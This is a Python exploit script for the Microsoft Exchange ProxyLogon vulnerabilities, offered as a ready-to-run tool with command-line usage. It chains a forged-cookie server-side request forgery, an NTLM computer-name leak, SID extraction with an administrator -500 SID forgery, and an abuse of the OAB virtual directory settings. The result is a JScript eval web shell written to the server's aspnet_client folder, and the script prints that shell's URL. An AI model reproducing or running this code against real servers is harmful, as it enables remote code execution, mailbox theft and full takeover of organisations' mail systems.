# -*- encoding: utf-8 -*-
'''
-------------------------------------------------------
@File    :   ProxyLogon.py
@Time    :   2021/03/13 21:13:01
@Version :   1.0.0
@License :   
@Desc    :   
@Author  :   p0wershe11, RGDZ
-------------------------------------------------------
'''



from random import Random, randint, random
import re
import string
import sys
import json
import requests
from urllib.parse import urlencode
from struct import unpack
from base64 import b64encode, b64decode

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class IOFlow(str):

    def __init__(self) -> None:
        super().__init__()
        self._cout = sys.stdout

    def _write(self, s:str):
        self.cout.write(s)

    def __lshift__(self, s: str)->int:
        return self._cout.write(s)

endl = "\n"
cout = IOFlow()

class Color:
    START       = "\033["
    END         = START+"0m"
    

    C_RED         = START+"31m"
    C_GREEN       = START+"32m"
    C_YELLOW      = START+"33m"
    C_BLUE        = START+"34m"

    # RANDOM_COLOR    = random.choice()

class Color(Color):
    ALL_COLOR       =   {k:v for k, v in Color.__dict__.items() if "C_" in k}
    _COLOR_S        = lambda color, s: color+s+Color.END

class Color(Color):

    RED_S           = lambda s: Color._COLOR_S(Color.C_RED, s)
    GREEN_S         = lambda s: Color._COLOR_S(Color.C_GREEN, s)
    YELLOW_S        = lambda s: Color._COLOR_S(Color.C_YELLOW, s)
    BLUE_S          = lambda s: Color._COLOR_S(Color.C_BLUE, s)

class Log:
    BASE_SYM        = lambda sym: f"{sym}"
    TEMPLATE        = lambda sym, msg: cout << f"{sym}:{msg}\n"

class Log(Log):
    INFO_SYM            = Log.BASE_SYM(Color.BLUE_S("[*]"))
    WARING_SYM          = Log.BASE_SYM(Color.YELLOW_S("[!]"))
    SUCCESS_SYM         = Log.BASE_SYM(Color.GREEN_S("[+]"))

class Log(Log):
    info                = lambda msg: Log.TEMPLATE(Log.INFO_SYM, msg)
    waring              = lambda msg: Log.TEMPLATE(Log.WARING_SYM, msg)
    success             = lambda msg: Log.TEMPLATE(Log.SUCCESS_SYM, msg)


ARGS            = [dict(v) for v in [zip(v.split("=")[0::2], v.split("=")[1::2]) for v in sys.argv[1:]]]


check_argv      = lambda arg: arg in sys.argv



HOST = ""
MAIL = ""
MAILS = ""
LOCAL_NAME = ""

ascii_letters = string.ascii_letters
SHELL_NAME = "".join(ascii_letters[randint(0, len(ascii_letters)-1)] for i in range(10))
FILE_PATH = f'C:\\inetpub\\wwwroot\\aspnet_client\\{SHELL_NAME}.aspx'
FILE_DATA = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["command"],"unsafe");}</script>'


def _unpack_str(byte_string):
    return byte_string.decode('UTF-8').replace('\x00', '')

def _unpack_int(format, data):
    return unpack(format, data)[0]


def exploit(path, qs='', data='', cookies=[], headers={}):
    global HOST, LOCAL_NAME

    cookies = list(cookies)
    cookies.extend([f"X-BEResource=a]@{LOCAL_NAME}:444{path}?{qs}#~1941962753"])
    if not headers:
        headers = {
            'Content-Type': 'application/json'
        }
    headers['Cookie'] = ';'.join(cookies)
    headers['msExchLogonMailbox'] = 'S-1-5-20'

    url = f"https://{HOST}/ecp/y.js"
    resp = requests.post(url, headers=headers, data=data, verify=False, allow_redirects=False)
    return resp

def parse_challenge(auth):
    target_info_field  = auth[40:48]
    target_info_len     = _unpack_int('H', target_info_field[0:2])
    target_info_offset  = _unpack_int('I', target_info_field[4:8])

    target_info_bytes = auth[target_info_offset:target_info_offset+target_info_len]

    domain_name   = ''
    computer_name = ''
    info_offset   = 0
    while info_offset < len(target_info_bytes):
        av_id = _unpack_int('H', target_info_bytes[info_offset:info_offset+2])
        av_len = _unpack_int('H', target_info_bytes[info_offset+2:info_offset+4])
        av_value = target_info_bytes[info_offset+4:info_offset+4+av_len]

        info_offset = info_offset + 4 + av_len
        if av_id == 2:   # MsvAvDnsDomainName
            domain_name = _unpack_str(av_value)
        elif av_id == 3: # MsvAvDnsComputerName
            computer_name = _unpack_str(av_value)
    return domain_name, computer_name

def get_local_name():
    global LOCAL_NAME
    Log.info("Getting ComputerName and DomainName.")
    ntlm_type1 = (
        b'NTLMSSP\x00'                       # NTLMSSp Signature
        b'\x01\x00\x00\x00'                  # Message Type
        b'\x97\x82\x08\xe2'                  # Flags
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Domain String
        b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Workstation String
        b'\x0a\x00\xba\x47\x00\x00\x00\x0f'  # OS Version
    )
    headers = {
        'Authorization': f'Negotiate {b64encode(ntlm_type1).decode()}'
    }
    # print(headers)
    # assert False
    r = requests.get(f'https://{HOST}/rpc/', headers=headers, verify=False)
    assert r.status_code == 401, "Error while getting ComputerName"
    auth_header = r.headers['WWW-Authenticate']
    auth = re.search('Negotiate ([A-Za-z0-9/+=]+)', auth_header).group(1)
    domain_name, computer_name = parse_challenge(b64decode(auth))
    if not domain_name:
        Log.waring("DomainName not found.")
        return exit(0)
    if not computer_name:
        Log.waring("ComputerName not found")
        return exit(0)
    Log.info(f"Domain Name = {domain_name}")
    Log.info(f"Computer Name = {computer_name}")
    LOCAL_NAME = computer_name


def get_sid(mail):
    payload = f'''
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>{mail}</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
</Autodiscover>
'''
    headers = {
        'User-Agent': 'ExchangeServicesClient/0.0.0.0', 
        'Content-Type': 'text/xml'
    }
    resp = exploit('/autodiscover/autodiscover.xml', qs='', data=payload, headers=headers)
    res = re.search('<LegacyDN>(.*?)</LegacyDN>', resp.text)
    if not res:
        Log.waring("LegacyDN not found!")
        return

    headers = {
        'X-Clientapplication': 'Outlook/15.0.4815.1002', 
        'X-Requestid': 'x', 
        'X-Requesttype': 'Connect', 
        'Content-Type': 'application/mapi-http', 
    }
    legacyDN = res.group(1)
    payload = legacyDN + '\x00\x00\x00\x00\x00\x20\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00'
    r = exploit('/mapi/emsmdb/', qs='', data=payload, headers=headers)
    result = re.search('with SID ([S\-0-9]+) ', r.text)
    if not result:
        Log.waring(f"Not Found user: {mail}")
        return None
    sid = result.group(1)
    Log.info(f"sid:{sid}")
    if "500" not in sid.split("-"):
        Log.waring("500 not in sid.")
        sid = "-".join(sid.split("-")[:-1]+["500"])
        Log.info(f"add -500, sid:{sid}")
    return sid

   


def exp(mail_name, sid):
    payload = f'<r at="NTLM" ln="{mail_name}"><s t="0">{sid}</s></r>'
    resp = exploit('/ecp/proxyLogon.ecp', qs='', data=payload)
    Log.waring(f"Login status code:{resp.status_code}")

    session_id = resp.cookies.get('ASP.NET_SessionId')
    canary     = resp.cookies.get('msExchEcpCanary')
    Log.info(f'get ASP.NET_SessionId = {session_id}')
    Log.info(f"get msExchEcpCanary = {canary}")
    
    extra_cookies = [
        'ASP.NET_SessionId='+session_id, 
        'msExchEcpCanary='+canary
    ]
    qs = urlencode({
        'schema': 'OABVirtualDirectory', 
        'msExchEcpCanary': canary
    })
    r = exploit('/ecp/DDI/DDIService.svc/GetObject', qs=qs, data='', cookies=extra_cookies)
    identity = r.json()['d']['Output'][0]['Identity']
    Log.info(f"OAB Name = f{identity['DisplayName']}")
    Log.info(f"OAB ID = {identity['RawIdentity']}")

    # Set-OABVirtualDirectory
    Log.info("Setting up webshell payload through OAB")
    qs = urlencode({
        'schema': 'OABVirtualDirectory', 
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP', 
            'DisplayName': identity['DisplayName'], 
            'RawIdentity': identity['RawIdentity']
        }, 
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 
                'ExternalUrl': 'http://f/' + FILE_DATA
            }
        }
    })
    r = exploit('/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)
    assert r.status_code == 200, 'Error while setting up webshell payload'
    Log.success("Setting up webshell payload OK!")

    # save file
    Log.info("Writing shell...")
    qs = urlencode({
        'schema': 'ResetOABVirtualDirectory', 
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP', 
            'DisplayName': identity['DisplayName'], 
            'RawIdentity': identity['RawIdentity']
        }, 
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 
                'FilePathName': FILE_PATH
            }
        }
    })
    resp = exploit('/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)
    if resp.status_code != 200:
        Log.waring(f"Error while writing shell, status code is {resp.status_code}")
        return


    Log.info("Cleaning OAB...")
    qs = urlencode({
        'schema': 'OABVirtualDirectory', 
        'msExchEcpCanary': canary
    })
    payload = json.dumps({
        'identity': {
            '__type': 'Identity:ECP', 
            'DisplayName': identity['DisplayName'], 
            'RawIdentity': identity['RawIdentity']
        }, 
        'properties': {
            'Parameters': {
                '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 
                'ExternalUrl': ''
            }
        }
    })
    resp = exploit('/ecp/DDI/DDIService.svc/SetObject', qs=qs, data=payload, cookies=extra_cookies)
    Log.info(f"resp:{resp.status_code}")
    Log.success(f"shell: https://{HOST}/aspnet_client/{SHELL_NAME}.aspx")



def run(runner):
    global HOST, MAILS
    f = open(MAILS)
    try:
        while True:
            mail = next(f)[:-1]
            return runner(mail)
    except:
        Log.waring("mails file has been read.")

def runner(mail):
    get_local_name()
    sid = get_sid(mail)
    if not sid:
        return
    return exp(mail.split('@')[0], sid)

def main():
    global HOST, MAILS, MAIL, ARGS
    args = {}
    for v in ARGS:
        args.update(v)

    HOST = args.get("--host")
    if not HOST:
        return help()
    
    MAIL=args.get("--mail")
    if MAIL:
        return runner(MAIL)

    MAILS=args.get("--mails")
    if MAILS:
        return run(runner)

def help():
    cout << f"""usage:
    python {__file__} --host=exchange.com --mail=admin@exchange.com
    python {__file__} --host=exchange.com --mails=./mails.txt
args:
    --host: target's address.
    --mail: exists user's mail.
    --mails: mails file.
    """
    cout << endl

def Logo():
    return ''' 
=============================================================
             
 ___                     _                       
| . \ _ _  ___ __   _ _ | |   ___  ___  ___ ._ _ 
|  _/| '_>/ . \\ \/| | || |_ / . \/ . |/ . \| ' |
|_|  |_|  \___//\_\`_. ||___|\___/\_. |\___/|_|_|
                   <___'          <___'          

                                    author: p0wershe11,RGDZ
=============================================================
'''


if __name__ == "__main__":
    cout << Logo()
    main()